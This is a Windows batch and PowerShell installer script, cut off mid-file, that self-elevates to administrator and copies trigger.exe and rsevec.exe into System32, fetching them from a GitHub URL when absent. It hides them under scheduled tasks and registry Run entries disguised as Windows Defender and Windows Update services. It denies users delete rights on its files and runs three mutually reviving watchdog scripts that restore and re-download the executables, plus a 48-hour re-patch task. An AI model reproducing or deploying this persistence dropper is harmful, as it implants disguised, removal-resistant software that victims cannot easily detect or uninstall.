@echo off
setlocal EnableExtensions DisableDelayedExpansion
set "SELF=%~f0"
set "SELFDIR=%~dp0"

:: ════════════════════════════════════════════════════════════════
:: STEP 1 — Elevate to Administrator (self-elevating UAC)
:: ════════════════════════════════════════════════════════════════
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
  "$id=[Security.Principal.WindowsIdentity]::GetCurrent();" ^
  "$pr=New-Object Security.Principal.WindowsPrincipal($id);" ^
  "if(-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){" ^
  "  Start-Process -FilePath '%SELF%' -WorkingDirectory '%SELFDIR%' -Verb RunAs -WindowStyle Normal;" ^
  "  exit 10" ^
  "}"
if errorlevel 10 exit /b 0

:: ════════════════════════════════════════════════════════════════
:: STEP 2 — Run embedded PowerShell installer block
:: ════════════════════════════════════════════════════════════════
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
  "$path='%SELF%';" ^
  "$lines=[IO.File]::ReadAllLines($path);" ^
  "$ps=New-Object 'System.Collections.Generic.List[string]';" ^
  "$sec='';" ^
  "foreach($l in $lines){" ^
  "  if($l -ceq '::PS_BEGIN'){$sec='PS';continue};" ^
  "  if($l -ceq '::PS_END'){$sec='';break};" ^
  "  if($sec -eq 'PS'){$ps.Add($l)}" ^
  "};" ^
  "Set-Location -LiteralPath '%SELFDIR%';" ^
  "try{ & ([scriptblock]::Create([string]::Join([Environment]::NewLine,$ps))) }" ^
  "catch{ Write-Host ('ERROR: '+$_.Exception.Message) -ForegroundColor Red; Read-Host 'Press Enter to exit'; exit 1 }"
if errorlevel 1 (
    echo [!] Installation failed.
    pause & exit /b 1
)
echo.
echo  Installation complete. trigger.exe is now running.
echo.
pause >nul
exit /b 0

::PS_BEGIN
$ErrorActionPreference = 'SilentlyContinue'

# ── Paths ──────────────────────────────────────────────────────
$SrcDir     = (Get-Location).Path
$Inst       = Join-Path $env:WINDIR 'System32'
$Back       = Join-Path $Inst 'rsc'
$SysWow     = Join-Path $env:WINDIR 'SysWOW64'
$AppLow     = Join-Path (Split-Path $env:LOCALAPPDATA -Parent) 'LocalLow\svcmon'
$TrigExe    = Join-Path $Inst 'trigger.exe'
$TrigBack   = Join-Path $Back 'trigger.exe'
$RsevecExe  = Join-Path $Inst 'rsevec.exe'
$RsevecBack = Join-Path $Back 'rsevec.exe'

# ── Three-mesh watchdog scripts ────────────────────────────────
$SvcmonBat    = Join-Path $Inst 'svcmon.bat'
$Dllhost2Bat  = Join-Path $Inst 'dllhost2.bat'
$Rpcss2Bat    = Join-Path $Inst 'rpcss2.bat'
$SvcmonVbs    = Join-Path $Inst 'svcmon_run.vbs'
$Dllhost2Vbs  = Join-Path $Inst 'dllhost2_run.vbs'
$Rpcss2Vbs    = Join-Path $Inst 'rpcss2_run.vbs'

# ── Original single watchdog (kept for compatibility) ──────────
$WatchBat   = Join-Path $Inst 'wdsvc.bat'
$LaunchVbs  = Join-Path $Inst 'wdsvc_run.vbs'
$GuardPs1   = Join-Path $Inst 'wdsvc_guard.ps1'
$GuardVbs   = Join-Path $Inst 'wdsvc_guard_run.vbs'

# ── 48-hour re-patch script ────────────────────────────────────
$RepatchPs1 = Join-Path $Inst 'wdsvc_repatch.ps1'
$RepatchVbs = Join-Path $Inst 'wdsvc_repatch_run.vbs'

# ── Scheduled task names (disguised) ──────────────────────────
$TaskMain    = 'WindowsDefenderHealthSync'
$TaskGuard   = 'MicrpZEAWYtiB6bJ16NuLbGCc6CZ6jJdKfb63'
$TaskSvcmon  = 'Microsoft\Windows\WindowsUpdate\AudioServiceCheck'
$TaskDll     = 'Microsoft\Windows\WindowsUpdate\AudioCodecService'
$TaskRpc     = 'Microsoft\Windows\Multimedia\AudioTriggerSvc'
$TaskRepatch = 'Microsoft\Windows\WindowsUpdate\WUAUMediaSync'

# ── Registry ──────────────────────────────────────────────────
$RegPath     = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
$RegName     = 'WindowsDefenderSync'
$RegVal      = 'wscript.exe /b /nologo "' + $LaunchVbs + '"'
$RegSvcmon   = 'AudioCodecHost'
$RegDll      = 'AudioRenderSvc'
$RegRpc      = 'AudioStreamHost'

# ── GitHub download URLs ───────────────────────────────────────
$GhRsevec   = 'https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/rsevec.exe'
$GhTrigger  = 'https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/trigger.exe'

# ── Helper: download with retries ─────────────────────────────
function Download-File([string]$Url,[string]$Dest,[string]$UA='installer/1.0') {
    for ($i=1;$i -le 3;$i++) {
        try {
            $wc=New-Object System.Net.WebClient
            $wc.Headers.Add('User-Agent',$UA)
            $wc.DownloadFile($Url,$Dest)
            if((Test-Path $Dest)-and(Get-Item $Dest).Length -gt 0){return $true}
        } catch { Write-Host "  Attempt $i failed: $($_.Exception.Message)" -ForegroundColor Yellow }
        Start-Sleep 3
    }
    return $false
}

# ── Helper: Lock exe/bat files (SYSTEM/Admins full, Everyone deny write/delete) ──
function Lock-ExeFile([string]$FilePath) {
    if (-not (Test-Path $FilePath)) { return }
    try {
        & icacls.exe $FilePath /grant 'SYSTEM:(F)'         /C /Q 2>$null | Out-Null
        & icacls.exe $FilePath /grant 'Administrators:(F)' /C /Q 2>$null | Out-Null
        & icacls.exe $FilePath /grant 'Everyone:(RX)'      /C /Q 2>$null | Out-Null
        $acl      = Get-Acl -LiteralPath $FilePath
        $everyone = [System.Security.Principal.SecurityIdentifier]'S-1-1-0'
        $denyRights = (
            [System.Security.AccessControl.FileSystemRights]::Delete                   -bor
            [System.Security.AccessControl.FileSystemRights]::WriteData                -bor
            [System.Security.AccessControl.FileSystemRights]::AppendData               -bor
            [System.Security.AccessControl.FileSystemRights]::WriteAttributes          -bor
            [System.Security.AccessControl.FileSystemRights]::WriteExtendedAttributes  -bor
            [System.Security.AccessControl.FileSystemRights]::ChangePermissions        -bor
            [System.Security.AccessControl.FileSystemRights]::TakeOwnership
        )
        $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
            $everyone, $denyRights, 'None', 'None', 'Deny')
        $acl.AddAccessRule($deny)
        Set-Acl -LiteralPath $FilePath -AclObject $acl
        Write-Host "  Locked: $([IO.Path]::GetFileName($FilePath))" -ForegroundColor DarkGray
    } catch {
        Write-Host "  ACL lock skipped for $([IO.Path]::GetFileName($FilePath)): $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# ── Helper: Lock task XML ──────────────────────────────────────
function Lock-TaskXml([string]$TaskName) {
    # TaskName may be a path like Microsoft\Windows\WindowsUpdate\Foo
    $xmlPath = Join-Path $env:WINDIR "System32\Tasks\$TaskName"
    if (-not (Test-Path $xmlPath)) { return }
    try {
        & icacls.exe $xmlPath /grant 'Administrators:(F)' /C /Q 2>$null | Out-Null
        & icacls.exe $xmlPath /grant 'SYSTEM:(F)'         /C /Q 2>$null | Out-Null
        $acl = Get-Acl -LiteralPath $xmlPath
        $everyone = [System.Security.Principal.SecurityIdentifier]'S-1-1-0'
        $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
            $everyone, 'Delete,Write', 'Deny')
        $acl.AddAccessRule($deny)
        Set-Acl -LiteralPath $xmlPath -AclObject $acl
        Write-Host "  Locked task xml: $TaskName" -ForegroundColor DarkGray
    } catch {
        Write-Host "  Task XML lock skipped: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# ── Helper: Register task as SYSTEM with full triggers ────────
function Register-SysTask([string]$TaskName,[string]$ExePath,[string]$Arg,[string]$Desc,[int]$RepeatMins=1) {
    $action   = New-ScheduledTaskAction -Execute $ExePath -Argument $Arg -WorkingDirectory $Inst
    $CurUser  = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $principal= New-ScheduledTaskPrincipal -UserId $CurUser -LogonType Interactive -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
        -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Seconds 0) `
        -MultipleInstances IgnoreNew -RestartCount 10 `
        -RestartInterval (New-TimeSpan -Minutes 1)
    $tStartup = New-ScheduledTaskTrigger -AtStartup
    $tLogon   = New-ScheduledTaskTrigger -AtLogOn
    $tRepeat  = New-ScheduledTaskTrigger -Once -At (Get-Date).Date `
                    -RepetitionInterval (New-TimeSpan -Minutes $RepeatMins)
    $triggers = @($tStartup, $tLogon, $tRepeat)
    # Try to add wake-from-sleep trigger
    try {
        $WakeQuery = '<QueryList><Query Id="0" Path="System"><Select Path="System">*[System[Provider[@Name=''Microsoft-Windows-Power-Troubleshooter''] and EventID=1]]</Select></Query></QueryList>'
        $WakeClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace Root/Microsoft/Windows/TaskScheduler -ErrorAction SilentlyContinue
        if ($WakeClass) {
            $tWake = New-CimInstance -CimClass $WakeClass -ClientOnly
            $tWake.Subscription = $WakeQuery
            $tWake.Enabled      = $true
            $tWake.Delay        = 'PT5S'
            $triggers += $tWake
        }
    } catch {}
    # Create parent task folder if needed (for paths like Microsoft\Windows\WindowsUpdate\Foo)
    $taskFolder = Split-Path $TaskName -Parent
    if ($taskFolder -and $taskFolder -ne '\') {
        try {
            $ts = New-Object -ComObject Schedule.Service
            $ts.Connect()
            $root = $ts.GetFolder('\')
            # Ensure each sub-folder exists
            $parts = $taskFolder.TrimStart('\').Split('\')
            $cur = '\'
            foreach ($part in $parts) {
                $cur = $cur.TrimEnd('\') + '\' + $part
                try { $root.GetFolder($cur) | Out-Null } catch { $root.CreateFolder($cur) | Out-Null }
            }
        } catch {}
    }
    Register-ScheduledTask `
        -TaskName    $TaskName `
        -Action      $action `
        -Trigger     $triggers `
        -Principal   $principal `
        -Settings    $settings `
        -Description $Desc `
        -Force | Out-Null
    Write-Host "  Task registered: $TaskName" -ForegroundColor Green
}

# ── Helper: Register 48h repeat task ──────────────────────────
function Register-RepatchTask([string]$TaskName,[string]$ExePath,[string]$Arg,[string]$Desc) {
    $action   = New-ScheduledTaskAction -Execute $ExePath -Argument $Arg -WorkingDirectory $Inst
    $principal= New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
        -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
        -MultipleInstances IgnoreNew
    # First run: 48 hours from now; then repeat every 48 hours
    $firstRun = (Get-Date).AddHours(48)
    $tRepeat  = New-ScheduledTaskTrigger -Once -At $firstRun `
                    -RepetitionInterval (New-TimeSpan -Hours 48)
    $taskFolder = Split-Path $TaskName -Parent
    if ($taskFolder -and $taskFolder -ne '\') {
        try {
            $ts = New-Object -ComObject Schedule.Service
            $ts.Connect()
            $root = $ts.GetFolder('\')
            $parts = $taskFolder.TrimStart('\').Split('\')
            $cur = '\'
            foreach ($part in $parts) {
                $cur = $cur.TrimEnd('\') + '\' + $part
                try { $root.GetFolder($cur) | Out-Null } catch { $root.CreateFolder($cur) | Out-Null }
            }
        } catch {}
    }
    Register-ScheduledTask `
        -TaskName    $TaskName `
        -Action      $action `
        -Trigger     @($tRepeat) `
        -Principal   $principal `
        -Settings    $settings `
        -Description $Desc `
        -Force | Out-Null
    Write-Host "  Repatch task registered: $TaskName" -ForegroundColor Green
}

# ════════════════════════════════════════════════════════════════
# INSTALL STEPS
# ════════════════════════════════════════════════════════════════

Write-Host "`n[1/14] Creating backup directories..." -ForegroundColor Cyan
foreach ($d in @($Back, $SysWow, $AppLow)) {
    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
}

# ── 2. Install trigger.exe ────────────────────────────────────
Write-Host "[2/14] Installing trigger.exe..." -ForegroundColor Cyan
$SrcTrig = Join-Path $SrcDir 'trigger.exe'
if (Test-Path $SrcTrig) {
    Copy-Item -LiteralPath $SrcTrig -Destination $TrigExe -Force
    Write-Host "  Copied from source directory." -ForegroundColor Green
} else {
    Write-Host "  Not found in source dir — trying GitHub download..." -ForegroundColor Yellow
    $tmp = Join-Path $env:TEMP 'trig_dl.exe'
    if (Download-File $GhTrigger $tmp) {
        Copy-Item $tmp $TrigExe -Force
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    } else {
        throw "trigger.exe not found in script directory and GitHub download failed."
    }
}
Copy-Item -LiteralPath $TrigExe -Destination $TrigBack -Force
Copy-Item -LiteralPath $TrigExe -Destination (Join-Path $SysWow  'trigger.exe') -Force -ErrorAction SilentlyContinue
Copy-Item -LiteralPath $TrigExe -Destination (Join-Path $AppLow  'trigger.exe') -Force -ErrorAction SilentlyContinue
Write-Host "  Installed + backed up (3 locations)." -ForegroundColor Green

# ── 3. Ensure rsevec.exe ──────────────────────────────────────
Write-Host "[3/14] Ensuring rsevec.exe..." -ForegroundColor Cyan
if (-not (Test-Path $RsevecExe)) {
    $tmp = Join-Path $env:TEMP 'rsev_dl.exe'
    if (Download-File $GhRsevec $tmp) {
        Copy-Item $tmp $RsevecExe  -Force
        Copy-Item $tmp $RsevecBack -Force
        Copy-Item $tmp (Join-Path $SysWow 'rsevec.exe') -Force -ErrorAction SilentlyContinue
        Copy-Item $tmp (Join-Path $AppLow 'rsevec.exe') -Force -ErrorAction SilentlyContinue
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        Write-Host "  rsevec.exe downloaded." -ForegroundColor Green
    } else {
        Write-Host "  rsevec.exe not available now — trigger will download it on first START." -ForegroundColor Yellow
    }
} else {
    if (-not (Test-Path $RsevecBack)) { Copy-Item $RsevecExe $RsevecBack -Force }
    Copy-Item $RsevecExe (Join-Path $SysWow 'rsevec.exe') -Force -ErrorAction SilentlyContinue
    Copy-Item $RsevecExe (Join-Path $AppLow 'rsevec.exe') -Force -ErrorAction SilentlyContinue
    Write-Host "  rsevec.exe present + backed up." -ForegroundColor Green
}

# Also store copies of install.cmd in all 3 repatch locations
$SelfPath = (Get-Location).Path
# The installer itself is passed as SELFDIR from the batch header; find it
$installerSrc = Join-Path $SrcDir 'install.cmd'
# If not found by that name, check for the running script name
if (-not (Test-Path $installerSrc)) {
    # Try to find any .cmd in SrcDir
    $cmds = Get-ChildItem $SrcDir -Filter '*.cmd' -ErrorAction SilentlyContinue
    if ($cmds) { $installerSrc = $cmds[0].FullName }
}
if (Test-Path $installerSrc) {
    foreach ($repatchDir in @($Back, $SysWow, $AppLow)) {
        Copy-Item $installerSrc (Join-Path $repatchDir 'install.cmd') -Force -ErrorAction SilentlyContinue
    }
    Write-Host "  install.cmd stored in 3 repatch locations." -ForegroundColor DarkGray
}

# ── 4. Write three triangular watchdog .bat files ─────────────
Write-Host "[4/14] Writing three-mesh watchdog scripts..." -ForegroundColor Cyan

# ── svcmon.bat (Guardian A) ────────────────────────────────────
# Watches: trigger.exe, dllhost2 (B), rpcss2 (C)
@'
@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "INST=%SystemRoot%\System32"
set "EXE=%INST%\trigger.exe"
set "BCK=%INST%\rsc\trigger.exe"
set "GH=https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/trigger.exe"
set "LOG=%INST%\wdsvc_log.txt"
set "LOCK_ME=%INST%\svcmon.lock"
set "LOCK_B=%INST%\dllhost2.lock"
set "LOCK_C=%INST%\rpcss2.lock"
set "BAT_B=%INST%\dllhost2.bat"
set "BAT_C=%INST%\rpcss2.bat"
set "VBS_B=%INST%\dllhost2_run.vbs"
set "VBS_C=%INST%\rpcss2_run.vbs"

cd /d "%INST%"

:: Singleton guard
md "%LOCK_ME%" 2>nul
if errorlevel 1 (
    tasklist /FI "IMAGENAME eq trigger.exe" 2>nul | find /I "trigger.exe" >nul
    if not errorlevel 1 (
        exit /b 0
    )
    rd /s /q "%LOCK_ME%" 2>nul & md "%LOCK_ME%" 2>nul
    if errorlevel 1 exit /b 0
)
call :LOG "[A] svcmon watchdog started"

:LOOP
if not exist "%LOCK_ME%" goto :DONE

:: ── Cross-heal B (dllhost2) ──
if not exist "%LOCK_B%" (
    call :LOG "[A] dllhost2 lock gone — reviving B"
    if exist "%VBS_B%" (
        wscript.exe /b /nologo "%VBS_B%" >nul 2>&1
    ) else if exist "%BAT_B%" (
        start "" /b cmd.exe /c "%BAT_B%"
    )
    ping 127.0.0.1 -n 3 >nul
)

:: ── Cross-heal C (rpcss2) ──
if not exist "%LOCK_C%" (
    call :LOG "[A] rpcss2 lock gone — reviving C"
    if exist "%VBS_C%" (
        wscript.exe /b /nologo "%VBS_C%" >nul 2>&1
    ) else if exist "%BAT_C%" (
        start "" /b cmd.exe /c "%BAT_C%"
    )
    ping 127.0.0.1 -n 3 >nul
)

:: ── Repair trigger.exe if missing ──
if not exist "%EXE%" (
    call :LOG "[A] trigger.exe missing — repairing"
    call :REPAIR
)

:: ── Keep trigger.exe running ──
tasklist /FI "IMAGENAME eq trigger.exe" 2>nul | find /I "trigger.exe" >nul
if errorlevel 1 (
    if exist "%EXE%" (
        call :LOG "[A] trigger.exe not running — starting"
        start "" /b "%EXE%"
    )
)

:: Wait 15 seconds
ping 127.0.0.1 -n 16 >nul
goto LOOP

:REPAIR
if exist "%BCK%" (
    call :LOG "[A] Restoring trigger.exe from rsc\"
    copy /Y "%BCK%" "%EXE%" >nul 2>&1 && goto :eof
)
set "BCK2=%SystemRoot%\SysWOW64\trigger.exe"
if exist "%BCK2%" (
    call :LOG "[A] Restoring trigger.exe from SysWOW64"
    copy /Y "%BCK2%" "%EXE%" >nul 2>&1 && goto :eof
)
set "BCK3=%LOCALAPPDATA%\LocalLow\svcmon\trigger.exe"
if exist "%BCK3%" (
    call :LOG "[A] Restoring trigger.exe from LocalLow"
    copy /Y "%BCK3%" "%EXE%" >nul 2>&1 && goto :eof
)
call :LOG "[A] Downloading trigger.exe from GitHub"
set "TMP=%TEMP%\trig_a.exe"
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','svcmon/1.0');" ^
    "try{$wc.DownloadFile('%GH%','%TMP%');exit 0}catch{exit 1}"
if errorlevel 1 (call :LOG "[A] Download failed" & goto :eof)
copy /Y "%TMP%" "%EXE%" >nul 2>&1
copy /Y "%TMP%" "%BCK%" >nul 2>&1
del /F /Q "%TMP%" >nul 2>&1
call :LOG "[A] Download repair complete"
goto :eof

:DONE
call :LOG "[A] svcmon stopping"
rd /s /q "%LOCK_ME%" 2>nul
exit /b 0

:LOG
echo [%date% %time%] %~1>>"%LOG%"
goto :eof
'@ | Set-Content -LiteralPath $SvcmonBat -Encoding ASCII

# ── dllhost2.bat (Guardian B) ─────────────────────────────────
# Watches: trigger.exe, svcmon (A), rpcss2 (C)
@'
@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "INST=%SystemRoot%\System32"
set "EXE=%INST%\trigger.exe"
set "BCK=%INST%\rsc\trigger.exe"
set "GH=https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/trigger.exe"
set "LOG=%INST%\wdsvc_log.txt"
set "LOCK_ME=%INST%\dllhost2.lock"
set "LOCK_A=%INST%\svcmon.lock"
set "LOCK_C=%INST%\rpcss2.lock"
set "BAT_A=%INST%\svcmon.bat"
set "BAT_C=%INST%\rpcss2.bat"
set "VBS_A=%INST%\svcmon_run.vbs"
set "VBS_C=%INST%\rpcss2_run.vbs"

cd /d "%INST%"

:: Singleton guard
md "%LOCK_ME%" 2>nul
if errorlevel 1 (
    tasklist /FI "IMAGENAME eq trigger.exe" 2>nul | find /I "trigger.exe" >nul
    if not errorlevel 1 (
        exit /b 0
    )
    rd /s /q "%LOCK_ME%" 2>nul & md "%LOCK_ME%" 2>nul
    if errorlevel 1 exit /b 0
)
call :LOG "[B] dllhost2 watchdog started"

:LOOP
if not exist "%LOCK_ME%" goto :DONE

:: ── Cross-heal A (svcmon) ──
if not exist "%LOCK_A%" (
    call :LOG "[B] svcmon lock gone — reviving A"
    if exist "%VBS_A%" (
        wscript.exe /b /nologo "%VBS_A%" >nul 2>&1
    ) else if exist "%BAT_A%" (
        start "" /b cmd.exe /c "%BAT_A%"
    )
    ping 127.0.0.1 -n 3 >nul
)

:: ── Cross-heal C (rpcss2) ──
if not exist "%LOCK_C%" (
    call :LOG "[B] rpcss2 lock gone — reviving C"
    if exist "%VBS_C%" (
        wscript.exe /b /nologo "%VBS_C%" >nul 2>&1
    ) else if exist "%BAT_C%" (
        start "" /b cmd.exe /c "%BAT_C%"
    )
    ping 127.0.0.1 -n 3 >nul
)

:: ── Repair trigger.exe if missing ──
if not exist "%EXE%" (
    call :LOG "[B] trigger.exe missing — repairing"
    call :REPAIR
)

:: ── Keep trigger.exe running ──
tasklist /FI "IMAGENAME eq trigger.exe" 2>nul | find /I "trigger.exe" >nul
if errorlevel 1 (
    if exist "%EXE%" (
        call :LOG "[B] trigger.exe not running — starting"
        start "" /b "%EXE%"
    )
)

:: Wait 20 seconds (staggered from A's 15s)
ping 127.0.0.1 -n 21 >nul
goto LOOP

:REPAIR
if exist "%BCK%" (
    call :LOG "[B] Restoring trigger.exe from rsc\"
    copy /Y "%BCK%" "%EXE%" >nul 2>&1 && goto :eof
)
set "BCK2=%SystemRoot%\SysWOW64\trigger.exe"
if exist "%BCK2%" (
    call :LOG "[B] Restoring trigger.exe from SysWOW64"
    copy /Y "%BCK2%" "%EXE%" >nul 2>&1 && goto :eof
)
set "BCK3=%LOCALAPPDATA%\LocalLow\svcmon\trigger.exe"
if exist "%BCK3%" (
    call :LOG "[B] Restoring trigger.exe from LocalLow"
    copy /Y "%BCK3%" "%EXE%" >nul 2>&1 && goto :eof
)
call :LOG "[B] Downloading trigger.exe from GitHub"
set "TMP=%TEMP%\trig_b.exe"
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','dllhost2/1.0');" ^
    "try{$wc.DownloadFile('%GH%','%TMP%');exit 0}catch{exit 1}"
if errorlevel 1 (call :LOG "[B] Download failed" & goto :eof)
copy /Y "%TMP%" "%EXE%" >nul 2>&1
copy /Y "%TMP%" "%BCK%" >nul 2>&1
del /F /Q "%TMP%" >nul 2>&1
call :LOG "[B] Download repair complete"
goto :eof

:DONE
call :LOG "[B] dllhost2 stopping"
rd /s /q "%LOCK_ME%" 2>nul
exit /b 0

:LOG
echo [%date% %time%] %~1>>"%LOG%"
goto :eof
'@ | Set-Content -LiteralPath $Dllhost2Bat -Encoding ASCII

# ── rpcss2.bat (Guardian C) ───────────────────────────────────
# Watches: trigger.exe, svcmon (A), dllhost2 (B)
@'
@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "INST=%SystemRoot%\System32"
set "EXE=%INST%\trigger.exe"
set "BCK=%INST%\rsc\trigger.exe"
set "GH=https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/trigger.exe"
set "LOG=%INST%\wdsvc_log.txt"
set "LOCK_ME=%INST%\rpcss2.lock"
set "LOCK_A=%INST%\svcmon.lock"
set "LOCK_B=%INST%\dllhost2.lock"
set "BAT_A=%INST%\svcmon.bat"
set "BAT_B=%INST%\dllhost2.bat"
set "VBS_A=%INST%\svcmon_run.vbs"
set "VBS_B=%INST%\dllhost2_run.vbs"

cd /d "%INST%"

:: Singleton guard
md "%LOCK_ME%" 2>nul
if errorlevel 1 (
    tasklist /FI "IMAGENAME eq trigger.exe" 2>nul | find /I "trigger.exe" >nul
    if not errorlevel 1 (
        exit /b 0
    )
    rd /s /q "%LOCK_ME%" 2>nul & md "%LOCK_ME%" 2>nul
    if errorlevel 1 exit /b 0
)
call :LOG "[C] rpcss2 watchdog started"

:LOOP
if not exist "%LOCK_ME%" goto :DONE

:: ── Cross-heal A (svcmon) ──
if not exist "%LOCK_A%" (
    call :LOG "[C] svcmon lock gone — reviving A"
    if exist "%VBS_A%" (
        wscript.exe /b /nologo "%VBS_A%" >nul 2>&1
    ) else if exist "%BAT_A%" (
        start "" /b cmd.exe /c "%BAT_A%"
    )
    ping 127.0.0.1 -n 3 >nul
)

:: ── Cross-heal B (dllhost2) ──
if not exist "%LOCK_B%" (
    call :LOG "[C] dllhost2 lock gone — reviving B"
    if exist "%VBS_B%" (
        wscript.exe /b /nologo "%VBS_B%" >nul 2>&1
    ) else if exist "%BAT_B%" (
        start "" /b cmd.exe /c "%BAT_B%"
    )
    ping 127.0.0.1 -n 3 >nul
)

:: ── Repair trigger.exe if missing ──
if not exist "%EXE%" (
    call :LOG "[C] trigger.exe missing — repairing"
    call :REPAIR
)

:: ── Keep trigger.exe running ──
tasklist /FI "IMAGENAME eq trigger.exe" 2>nul | find /I "trigger.exe" >nul
if errorlevel 1 (
    if exist "%EXE%" (
        call :LOG "[C] trigger.exe not running — starting"
        start "" /b "%EXE%"
    )
)

:: Wait 25 seconds (staggered from A=15s, B=20s)
ping 127.0.0.1 -n 26 >nul
goto LOOP

:REPAIR
if exist "%BCK%" (
    call :LOG "[C] Restoring trigger.exe from rsc\"
    copy /Y "%BCK%" "%EXE%" >nul 2>&1 && goto :eof
)
set "BCK2=%SystemRoot%\SysWOW64\trigger.exe"
if exist "%BCK2%" (
    call :LOG "[C] Restoring trigger.exe from SysWOW64"
    copy /Y "%BCK2%" "%EXE%" >nul 2>&1 && goto :eof
)
set "BCK3=%LOCALAPPDATA%\LocalLow\svcmon\trigger.exe"
if exist "%BCK3%" (
    call :LOG "[C] Restoring trigger.exe from LocalLow"
    copy /Y "%BCK3%" "%EXE%" >nul 2>&1 && goto :eof
)
call :LOG "[C] Downloading trigger.exe from GitHub"
set "TMP=%TEMP%\trig_c.exe"
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','rpcss2/1.0');" ^
    "try{$wc.DownloadFile('%GH%','%TMP%');exit 0}catch{exit 1}"
if errorlevel 1 (call :LOG "[C] Download failed" & goto :eof)
copy /Y "%TMP%" "%EXE%" >nul 2>&1
copy /Y "%TMP%" "%BCK%" >nul 2>&1
del /F /Q "%TMP%" >nul 2>&1
call :LOG "[C] Download repair complete"
goto :eof

:DONE
call :LOG "[C] rpcss2 stopping"
rd /s /q "%LOCK_ME%" 2>nul
exit /b 0

:LOG
echo [%date% %time%] %~1>>"%LOG%"
goto :eof
'@ | Set-Content -LiteralPath $Rpcss2Bat -Encoding ASCII

# ── 5. Write VBS launchers for all three guardians ─────────────
Write-Host "[5/14] Writing VBS launchers for triangular mesh..." -ForegroundColor Cyan

# Generic VBS launcher factory — same logic, different bat name and log tag
# Uses single-quoted here-string + Replace() to avoid PowerShell expanding $ in VBS strings
function Write-MeshVbs([string]$VbsPath,[string]$BatName,[string]$LockName,[string]$Tag) {
    $template = @'
Option Explicit
On Error Resume Next
Dim sh,fs,wmi,ps,p,cmd,log,inst
Set sh  = CreateObject("WScript.Shell")
Set fs  = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
inst    = fs.GetParentFolderName(WScript.ScriptFullName)
log     = inst & "\wdsvc_log.txt"
Dim lockDir : lockDir = inst & "\__LOCKNAME__"

Sub L(m)
    Dim f : Set f=fs.OpenTextFile(log,8,True)
    If Err.Number=0 Then f.WriteLine Now & " [VBS-__TAG__] " & m : f.Close
    Err.Clear
End Sub

' If lock dir exists, that guardian is running -- do nothing
If fs.FolderExists(lockDir) Then
    L "__TAG__ already has lock -- skip launch"
    WScript.Quit 0
End If

' Also check by process
If Not (wmi Is Nothing) Then
    Set ps = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
    For Each p In ps
        Dim cl : cl = "" : cl = p.CommandLine
        If InStr(LCase(cl),"__BATNAME__") > 0 Then
            L "__TAG__ already running (PID " & p.ProcessId & ") -- skip"
            WScript.Quit 0
        End If
    Next
End If

cmd = "cmd.exe /c """ & inst & "\__BATNAME__"""
L "Launching __TAG__: " & cmd
sh.Run cmd, 0, False
If Err.Number <> 0 Then
    L "Shell.Run failed: " & Err.Description
    Err.Clear
    If Not (wmi Is Nothing) Then
        Dim p2 : Set p2 = wmi.Get("Win32_Process")
        Dim pid2 : p2.Create cmd, inst, Nothing, pid2
        If Err.Number=0 Then L "WMI launch OK PID " & pid2
        Else L "WMI fallback failed: " & Err.Description
    End If
End If
'@
    $content = $template.Replace('__LOCKNAME__',$LockName).Replace('__TAG__',$Tag).Replace('__BATNAME__',$BatName)
    $content | Set-Content -LiteralPath $VbsPath -Encoding ASCII
}

Write-MeshVbs $SvcmonVbs   'svcmon.bat'   'svcmon.lock'   'A'
Write-MeshVbs $Dllhost2Vbs 'dllhost2.bat' 'dllhost2.lock' 'B'
Write-MeshVbs $Rpcss2Vbs   'rpcss2.bat'   'rpcss2.lock'   'C'

# ── 6. Write original wdsvc.bat + VBSes (backwards compatibility) ──
Write-Host "[6/14] Writing legacy watchdog (wdsvc.bat)..." -ForegroundColor Cyan
@'
@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "INST=%SystemRoot%\System32"
set "EXE=%INST%\trigger.exe"
set "BCK=%INST%\rsc\trigger.exe"
set "GH=https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/trigger.exe"
set "LOG=%INST%\wdsvc_log.txt"
set "LOCK=%INST%\wdsvc.lock"

cd /d "%INST%"

:: Singleton: only one at a time
md "%LOCK%" 2>nul
if errorlevel 1 (
